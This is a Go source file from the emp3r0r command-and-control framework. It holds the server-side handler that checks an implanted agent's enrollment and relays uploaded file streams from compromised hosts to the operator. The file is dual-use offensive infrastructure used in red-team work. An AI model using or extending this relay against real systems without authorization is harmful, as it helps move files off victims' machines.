package server

import (
	"context"
	"io"
	"strconv"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// handleFileUploadStream processes an FTP upload directly over the pure CBOR encrypted stream.
// It bypasses the legacy HTTP multiplexer and injects the raw SecureConn into the stream handler.
func handleFileUploadStream(conn *transport.SecureConn, agentUUID, streamID, remoteAddr string, ctx context.Context, cancel context.CancelFunc) {
	if agentUUID == "" {
		logging.Errorf("handleFileUploadStream: blocked FTP stream from %s with empty agentUUID", remoteAddr)
		cancel()
		conn.Close()
		return
	}
	if streamID == "" {
		logging.Errorf("handleFileUploadStream: blocked FTP stream from %s with empty StreamID", remoteAddr)
		cancel()
		conn.Close()
		return
	}

	// SECURITY: Verify that agent is enrolled and has an active session.
	// Auxiliary routes (FTP, Proxy, WWW) are sub-operations of the main agent session.
	if agents.AgentDB == nil {
		logging.Errorf("handleFileUploadStream: AgentDB unavailable for %s from %s", strconv.Quote(agentUUID), remoteAddr)
		cancel()
		conn.Close()
		return
	}
	pinnedKey, _, found, lookupErr := agents.GetPinnedIdentity(agentUUID)
	if lookupErr != nil {
		logging.Errorf("CRITICAL: handleFileUploadStream: AgentDB lookup failed for %s from %s: %v", strconv.Quote(agentUUID), remoteAddr, lookupErr)
		cancel()
		conn.Close()
		return
	}
	if !found || pinnedKey == "" {
		logging.Errorf("CRITICAL: handleFileUploadStream: agent %s not enrolled or has empty pinned key from %s", strconv.Quote(agentUUID), remoteAddr)
		cancel()
		conn.Close()
		return
	}

	// Update heartbeat to show activity on this auxiliary channel
	_ = agents.UpdateSessionHeartbeat(agentUUID)

	// Clean up session heartbeat on exit
	defer func() {
		_ = agents.UpdateSessionHeartbeat(agentUUID)
	}()

	logging.Infof("CBOR FTP routing: relaying stream %s from %s to operator", streamID, remoteAddr)

	// Since we are not using an HTTP roundtripper to monitor Context cancelation for us,
	// we spawn a goroutine to force-close the underlying connection when the parent context
	// (or the dispatcher's stream timeout/cancellation) finishes.
	go func() {
		<-ctx.Done()
		conn.Close()
	}()

	streamAny, ok := network.FTPStreams.Load("token:" + streamID)
	if !ok {
		logging.Errorf("CRITICAL: handleFileUploadStream: unknown FTP token %q from %s", streamID, remoteAddr)
		cancel()
		conn.Close()
		return
	}
	sh, castOK := streamAny.(*network.StreamHandler)
	if !castOK || sh == nil {
		logging.Errorf("CRITICAL: handleFileUploadStream: invalid FTP stream handler for token %q", streamID)
		cancel()
		conn.Close()
		return
	}
	if sh.OperatorSession == "" {
		logging.Errorf("CRITICAL: handleFileUploadStream: missing owner operator for FTP token %q", streamID)
		cancel()
		conn.Close()
		return
	}

	relayTag := def.TagFTPRelayDataPrefix + streamID
	doneTag := def.TagFTPRelayDonePrefix + streamID
	errTag := def.TagFTPRelayErrorPrefix + streamID

	buf := make([]byte, 64*1024)
	for {
		n, readErr := conn.Read(buf)
		if n > 0 {
			chunk := make([]byte, n)
			copy(chunk, buf[:n])
			msg := def.MsgTunData{Tag: relayTag, Response: chunk}
			if sendErr := fwdMsgToOperator(sh.OperatorSession, msg); sendErr != nil {
				logging.Errorf("CRITICAL: handleFileUploadStream: relay chunk for token %q failed: %v", streamID, sendErr)
				cancel()
				conn.Close()
				return
			}
		}

		if readErr != nil {
			if readErr == io.EOF {
				_ = fwdMsgToOperator(sh.OperatorSession, def.MsgTunData{Tag: doneTag})
			} else {
				logging.Warningf("handleFileUploadStream: relay stream %q read error from %s: %v", streamID, remoteAddr, readErr)
				_ = fwdMsgToOperator(sh.OperatorSession, def.MsgTunData{Tag: errTag, Response: []byte(readErr.Error())})
			}
			break
		}
	}

	cancel()
	conn.Close()
}
